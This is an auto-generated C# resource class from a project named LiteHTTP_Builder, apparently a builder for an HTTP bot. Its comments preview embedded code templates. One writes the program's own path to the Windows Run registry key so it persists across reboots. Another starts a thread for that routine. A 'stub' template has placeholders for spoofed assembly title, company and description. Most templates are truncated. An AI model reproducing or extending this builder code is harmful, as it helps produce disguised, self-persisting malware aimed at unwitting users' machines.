//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace LiteHTTP_Builder.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("LiteHTTP_Builder.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to private static void startthread()
        ///        {
        ///            do
        ///            {
        ///                try
        ///                {
        ///                    if (!Misc.keyExists(Settings.startupkey))
        ///                    {
        ///                        RegistryKey reg = Registry.CurrentUser.OpenSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, true);
        ///                        reg.SetValue(Settings.startupkey, &quot;\&quot;&quot; + Misc.getLocation() + &quot;\&quot;&quot;, RegistryValueKind.String);
        ///                    }
        ///                }
        ///             [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string startup {
            get {
                return ResourceManager.GetString("startup", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to if (keyExists(Settings.startupkey))
        ///                {
        ///                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, true);
        ///                    regkey.DeleteValue(Settings.startupkey);
        ///                }.
        /// </summary>
        internal static string startupcheck {
            get {
                return ResourceManager.GetString("startupcheck", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static string startupkey = &quot;#startkey#&quot;;.
        /// </summary>
        internal static string startupline {
            get {
                return ResourceManager.GetString("startupline", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to s = new Thread(new ThreadStart(startthread));
        ///            s.Start();.
        /// </summary>
        internal static string startupthread {
            get {
                return ResourceManager.GetString("startupthread", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.Net;
        ///using System.Text;
        ///using Microsoft.Win32;
        ///using System.Threading;
        ///using System.Management;
        ///using System.Reflection;
        ///using System.Diagnostics;
        ///using System.Windows.Forms;
        ///using System.Security.Principal;
        ///using System.Collections.Generic;
        ///using System.Security.Cryptography;
        ///using System.Runtime.InteropServices;
        ///
        ///[assembly: AssemblyTitle(&quot;#assemtitle#&quot;)]
        ///[assembly: AssemblyDescription(&quot;#assemdesc#&quot;)]
        ///[assembly: AssemblyCompany(&quot;#assemcomp#&quot;)]
        ///[ [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string stub {
            get {
                return ResourceManager.GetString("stub", resourceCulture);
            }
        }
    }
}
